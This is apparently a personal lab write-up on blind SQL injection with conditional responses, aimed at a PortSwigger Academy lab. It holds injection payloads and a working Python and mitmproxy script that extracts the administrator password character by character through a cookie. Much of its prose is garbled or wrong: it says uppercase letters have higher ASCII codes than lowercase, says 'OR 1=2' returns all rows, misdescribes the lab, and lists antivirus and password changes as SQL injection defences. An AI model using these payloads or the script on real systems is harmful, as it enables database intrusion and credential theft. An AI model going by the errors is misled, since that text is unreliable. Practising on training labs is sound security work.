# Conditional response

A conditional query is a query that uses a conditional statement to determine which rows are returned. The most common conditional statement used in SQL is the `IF` statement. The `IF` statement takes a condition as input and returns one value if the condition is true and another value if the condition is false.

For example, the following SQL query uses the `IF` statement to return the name of the user if the user is logged in and the message "You are not logged in" if the user is not logged in:

```sql
SELECT
  IF(user_id IS NOT NULL, user_name, 'You are not logged in')
FROM users;
```

Another common conditional statement used in SQL is the `CASE` statement. The `CASE` statement takes a value as input and returns one value if the value matches a certain condition, another value if the value matches another condition, and so on.

For example, the following SQL query uses the `CASE` statement to return the name of the user's department if the user is in the marketing department, the name of the user's department if the user is in the sales department, and "Unknown" if the user is not in either department:

```sql
SELECT
  CASE
    WHEN department = 'marketing' THEN 'Marketing'
    WHEN department = 'sales' THEN 'Sales'
    ELSE 'Unknown'
  END
FROM users;
```

Conditional queries can be used to trigger conditional responses in a variety of ways. For example, you could use a conditional query to determine whether to show a message to the user, to determine which data to return to the user, or to determine which action to take based on the user's input.

Here are some examples of how you could use conditional queries to trigger conditional responses:

* You could use a conditional query to determine whether to show a message to the user. For example, you could use a conditional query to show a message to the user if they are logged in and not authorized to view a certain page.
* You could use a conditional query to determine which data to return to the user. For example, you could use a conditional query to return different data to the user depending on their role in the organization.
* You could use a conditional query to determine which action to take based on the user's input. For example, you could use a conditional query to take different actions depending on whether the user clicks a button or enters text into a field.

In SQL injection attacks, you can craft conditional queries that trigger different responses from the application to infer information indirectly. These conditional queries typically use boolean expressions or time-based functions to control the behavior of the injected SQL statement. Below are some examples of conditional queries that can be used in SQL injection attacks to trigger different responses:

1. **Boolean-Based Conditional Queries:**
   These queries rely on boolean expressions that evaluate to either true or false.

   a. Boolean-Based True Condition:
      ```
      ' OR 1=1; --
      ```
      This will always evaluate to true, causing the injected part of the SQL statement to be executed.

   b. Boolean-Based False Condition:
      ```
      ' OR 1=2; --
      ```
      This will always evaluate to false, effectively nullifying the original condition and allowing all data to be retrieved.

   c. Conditional Based on Database Content:
      ```
      ' OR (SELECT COUNT(*) FROM users WHERE role = 'admin') > 0; --
      ```
      This will trigger a response if the 'users' table contains at least one row with a 'role' column set to 'admin'.

2. **Time-Based Conditional Queries:**
   These queries introduce delays in the application's response to infer whether a condition is true or false based on the response time.

   a. Time-Based True Condition:
      ```
      ' OR IF(1=1, SLEEP(5), 0); --
      ```
      This will introduce a delay of 5 seconds if the condition `1=1` is true, indicating a successful injection.

   b. Time-Based False Condition:
      ```
      ' OR IF(1=2, SLEEP(5), 0); --
      ```
      This will not introduce any delay, as the condition `1=2` is always false.

Remember that these examples are for educational purposes only and should not be used for any unauthorized or malicious activity. SQL injection attacks are illegal and unethical unless you have explicit permission to perform security testing on an application. Always follow responsible disclosure practices and obtain proper authorization before attempting any security assessment.

## Substring

Here is a table of the substring method in different databases:

| Database | Substring method |
|---|---|
| MySQL | `SUBSTRING` |
| PostgreSQL | `SUBSTRING` |
| Oracle | `SUBSTR` |
| SQL Server | `SUBSTRING` |
| MariaDB | `SUBSTRING` |
| SQLite | `SUBSTR` |

As you can see, most databases use the `SUBSTRING` method for extracting substrings from strings. However, Oracle uses the `SUBSTR` method instead.

Here is an example of how to use the `SUBSTRING` method in MySQL:

```sql
SELECT SUBSTRING('Hello, world!', 6, 5);
```

This query will return the substring "world" from the string "Hello, world!". The first argument to the `SUBSTRING` method is the string that you want to extract the substring from. The second argument is the starting position of the substring. The third argument is the length of the substring.

More sensitive example with substring that will eventually determine the password
works like this:

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'o
```

This query will return true if the first letter of `administrator` password is
greater than `o`

Let's say you already managed to close this up to two letter, then you perform
this query:

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b
```

You will get your indirect result. If it's true, if not, something else will
happend, depending ont the particular blind SQL injection vulnerebility.

To check if the first letter of a column is greater than Z in SQL, you can use the following code:

```sql
SELECT
  column_name
FROM
  table_name
WHERE
  LOWER(SUBSTRING(column_name, 1, 1)) > 'z';
```

This code will first use the `SUBSTRING` function to extract the first letter of the column name. Then, it will use the `LOWER` function to convert the letter to lowercase. Finally, it will use the `>` operator to compare the lowercase letter to the letter Z.

If the first letter of the column name is greater than Z, then the query will return the row. Otherwise, the query will not return the row.

In SQL, capital and lowercase letters are treated differently when compared using the `>` sign. Capital letters are considered to be greater than lowercase letters. For example, the letter `A` is greater than the letter `a`.

This is because the ASCII code for capital letters is greater than the ASCII code for lowercase letters. The ASCII code for `A` is 65, while the ASCII code for `a` is 97.

Therefore, if you are comparing two strings that contain capital and lowercase letters, you need to make sure that both strings are converted to the same case before you compare them.

In SQL, by default, string comparisons are case-insensitive, meaning that capital and small letters are treated as the same. For example, 'abc' is considered equal to 'ABC' in a standard string comparison.

However, if you want to perform a case-sensitive comparison in SQL, you can use the appropriate collation for your comparison. A collation is a set of rules that determines how data is sorted and compared in a database.

To perform a case-sensitive comparison, you need to use a case-sensitive collation. The collation name typically includes the word "CS" (case-sensitive) or "BIN" (binary). Here's how you can use case-sensitive collations in different SQL database systems:

1. **MySQL:**
   In MySQL, you can use the `BINARY` keyword or specify a case-sensitive collation, such as `utf8_bin` or `latin1_bin`, for your comparison.

   Example with `BINARY` keyword:
   ```sql
   SELECT * FROM table_name WHERE BINARY column_name = 'caseSensitiveValue';
   ```

   Example with a specific collation:
   ```sql
   SELECT * FROM table_name WHERE column_name COLLATE utf8_bin = 'caseSensitiveValue';
   ```

2. **SQL Server (Transact-SQL):**
   In SQL Server, you can use the `COLLATE` clause to specify a case-sensitive collation for your comparison.

   Example:
   ```sql
   SELECT * FROM table_name WHERE column_name COLLATE Latin1_General_BIN = 'caseSensitiveValue';
   ```

3. **PostgreSQL:**
   In PostgreSQL, you can use the `COLLATE` clause with a case-sensitive collation.

   Example:
   ```sql
   SELECT * FROM table_name WHERE column_name COLLATE "C" = 'caseSensitiveValue';
   ```

4. **Oracle:**
   In Oracle, string comparisons are generally case-sensitive by default. However, if you want to ensure case-sensitive comparison, you can use the `BINARY` operator or the `NLSSORT` function.

   Example with `BINARY`:
   ```sql
   SELECT * FROM table_name WHERE column_name = BINARY 'caseSensitiveValue';
   ```

   Example with `NLSSORT`:
   ```sql
   SELECT * FROM table_name WHERE NLSSORT(column_name, 'NLS_SORT=BINARY') = NLSSORT('caseSensitiveValue', 'NLS_SORT=BINARY');
   ```

Please note that case-sensitive comparisons can have performance implications and might not be suitable for every situation. Use case-sensitive comparisons only when necessary and consider the impact on performance and search results.

Whether comparing letters in SQL is case sensitive depends on the database you are using. Some databases, such as MySQL and PostgreSQL, are case-insensitive by default, while others, such as Oracle and SQL Server, are case-sensitive by default.

You can check the case sensitivity of a database by looking at the collation of the database. The collation is a set of rules that determine how characters are compared.

If you want to make a comparison that is case-sensitive, you can use the `BINARY` operator. The `BINARY` operator will compare the two strings using their ASCII values, which means that capital letters will be considered greater than lowercase letters.

For example, the following query will return all rows where the `column` column contains the letter `A` in uppercase:

```sql
SELECT *
FROM table
WHERE column = BINARY 'A';
```

If you want to make a comparison that is case-insensitive, you can use the `ILIKE` operator. The `ILIKE` operator will compare the two strings ignoring case.

For example, the following query will return all rows where the `column` column contains the letter `A` in either uppercase or lowercase:

```sql
SELECT *
FROM table
WHERE column ILIKE 'A';
```

## Example usage of following scripts

<a href="https://asciinema.org/a/BRjBKPT3ZhF2B0AQ5nWKvG0o3" target="_blank"><img src="https://asciinema.org/a/BRjBKPT3ZhF2B0AQ5nWKvG0o3.svg" /></a>

Using 

```sql
' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

payload to check if `Welcome back!` will display again. It will if first letter
of administrator password is `a`. Change it to `>=` check if there's more letters
of password. `SUBSTR` function takes the string and takes it's part, in this case
starting at first character with length of 1 character.

mitmdump-runner.py

```python
#!/usr/bin/env python3
from mitmproxy.tools.main import mitmdump

mitmdump(args=["--listen-port", "8088", "--scripts", "mitmproxy-addon.py"])
```

mitmproxy-addon.py

```python
from logging import error
from mitmproxy import http
from mitmproxy import ctx
import json
import time

# class to determine administrator password
class AdministratorPassword:
    def __init__(self):
        self.data_file = "sqli-blind-conditional-request_data.json"
        self.password = ""
        self.password_length = 0
        self.url = ""
        self.cookies = {}
        self.tracking_id = ""
        self.update_json(self.password, self.password_length)

    def websocket_message(self, flow: http.HTTPFlow):
        # Check if the WebSocket connection should be dropped
        if self.should_drop(flow):
            flow.websocket.close(1000, b"Dropped by mitmproxy")
        if flow.websocket.messages[-1].opcode == 9:
            ctx.log.info("Dropping WebSocket ping from server")
            flow.websocket.close(1000, b"Dropped ping by mitmproxy")
        if flow.websocket.messages[-1].opcode == 10:
            ctx.log.info("Dropping WebSocket pong from server")
            flow.websocket.close(1000, b"Dropped pong by mitmproxy")

    def should_drop(self, flow: http.HTTPFlow) -> bool:
        # Implement your custom logic here to determine whether to drop the WebSocket connection
        # For example, you can inspect the flow and return True to drop the connection or False to keep it.
        return True

    def update_json(self, password, password_length):
        request_data = {}
        request_data["url"] = self.url
        request_data["cookies"] = {}
        for key in self.cookies.keys():
            request_data["cookies"][key] = self.cookies[key]
        request_data["tracking_id"] = self.tracking_id
        request_data["data_timestamp"] = str(time.time())
        with open(self.data_file, 'w') as f:
            request_dumps = json.dumps(request_data)
            f.write(request_dumps)

    def killable(self):
        return self.active and not (self.error and self.error.msg == error.KILLED_MESSAGE)

    def timestamp_start(self):
        return self.request.timestamp

    def response(self, flow: http.HTTPFlow) -> None:
        if "web-security-academy.net" in flow.request.pretty_url \
            and flow.response and flow.response.text and "Welcome back!" in flow.response.text:
                self.update_json(self.password, self.password_length)
                print("Hit!")

    def request(self, flow: http.HTTPFlow) -> None:
        if "web-security-academy.net" in flow.request.pretty_url \
            and "TrackingId" in flow.request.cookies.keys():
            self.url = flow.request.pretty_url
            self.cookies = flow.request.cookies
            if self.tracking_id == "":
                self.tracking_id = flow.request.cookies["TrackingId"]
            self.update_json(self.password, self.password_length)
            print("Hit!")

addons = [AdministratorPassword()]

# run mitmproxy with the following command
# mitmproxy -s mitmproxy-addon.py
```

requests.py

```python
import requests, urllib3
import urllib.parse
import json
from time import sleep
import os
import sys
from string import printable

urllib3.disable_warnings()

class BlindSQLiConditional:

    def __init__(self):
        # get command line arguments
        self.args = sys.argv
        self.data_file = 'sqli-blind-conditional-request_data.json'
        self.request_data = {}
        # check if file exists
        if not os.path.isfile(self.data_file):
            print(f"🕚 Wating for file {self.data_file} to be created...")
            sleep(10)
        print("📝 Updating from JSON file")
        with open(self.data_file) as f:
            content = f.read()
            self.request_data = json.loads(content)
        self.url = self.args[1]
        self.cookies = {}
        for key in self.request_data["cookies"].keys():
            self.cookies[key] = self.request_data["cookies"][key]
        self.tracking_id = self.request_data["tracking_id"]
        self.proxies = {
            "https": "https://0.0.0.0:8088"
        }
        self.req = requests.Session()
        self.password = ""

    def get_password(self, start=1, end=30):
        print("🔮 Determining password")
        first_char = printable[0]
        last_char = printable[-1]
        payload = f"{self.tracking_id}\' AND SUBSTR((SELECT password FROM users WHERE username=\'administrator\'),{start},1)>=\'{first_char}\'--"
        self.cookies["TrackingId"] = payload
        self.cookies["TrackingId"] = urllib.parse.quote(self.cookies["TrackingId"])
        print(f"Trying if there's more characters❓")
        response = self.req.get(self.url, cookies=self.cookies, proxies=self.proxies, verify=False)
        if response.status_code == 200:
            if response.text and "Welcome back!" in response.text:
                print(f"⚖️ There's more characters")
                for z in range(start, end):
                    for x in printable:
                        payload = f"{self.tracking_id}\' AND SUBSTR((SELECT password FROM users WHERE username=\'administrator\'),{z},1)=\'{x}\'--"
                        self.cookies["TrackingId"] = payload
                        self.cookies["TrackingId"] = urllib.parse.quote(self.cookies["TrackingId"])
                        print(f"Trying password: {x}❓")
                        response = self.req.get(self.url, cookies=self.cookies, proxies=self.proxies, verify=False)
                        if response.status_code == 200:
                            if response.text and "Welcome back!" in response.text:
                                print(f"⚖️ Found next password character: {x}")
                                self.password = self.password + x
                                print(f"📝 Currently know password {self.password}")
                                self.get_password(z+1, end)
        print(f"🔮 Password is: {self.password}")
        with open("sqli-blind-conditional-result", "w") as f:
            f.write(f"🔑 \'administrator\' password is: {self.password}")
        print("✅ Done, check file `sqli-blind-conditional-result` for outcome")
        exit(0)

BlindSQLiConditional().get_password()
```

Sure. The Blind SQL injection with conditional responses tutorial example in PortSwigger Academy demonstrates how a website can be vulnerable to blind SQL injection attacks by using conditional responses.

In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.

The website is vulnerable to blind SQL injection because it does not properly sanitize user input. This means that an attacker can inject malicious SQL code into the website's database.

The attacker can use this vulnerability to extract data from the database by injecting malicious SQL code that will cause a conditional response. When the error occurs, the website will not display an error message to the user, but the response will change depending on whether the condition is true or false.

To exploit this vulnerability, the attacker would first need to identify a database table that they want to extract data from. They can do this by submitting a variety of malicious SQL queries and observing the responses. Once the attacker has identified a table, they can then use conditional responses to extract the table contents.

The Blind SQL injection with conditional responses tutorial example is a good demonstration of how a website can be vulnerable to blind SQL injection attacks by using conditional responses. It is important to be aware of these vulnerabilities and to take steps to protect yourself.

Here are some tips for protecting yourself from blind SQL injection attacks:

* Use a strong username and password for your online accounts.
* Change your passwords regularly.
* Be suspicious of emails or text messages that ask for your personal information.
* Install antivirus software and keep it up to date.
* Be careful about what websites you visit and what links you click on.
* Train yourself and your employees on how to identify and avoid phishing attacks.

By following these tips, you can help to protect yourself from blind SQL injection attacks and keep your accounts safe.

In addition to the tips above, there are a few things that the website can do to protect itself from blind SQL injection attacks:

* Use a rate limiting mechanism to prevent users from submitting too many requests in a short period of time.
* Use a honeypot account to lure attackers into entering malicious SQL queries.
* Implement a CAPTCHA challenge to verify that the user is human.
* Use a prepared statement mechanism to prevent attackers from injecting malicious SQL code into the database.
* Use a database auditing mechanism to detect and log suspicious SQL queries.

By implementing these measures, the website can help to protect itself from blind SQL injection attacks.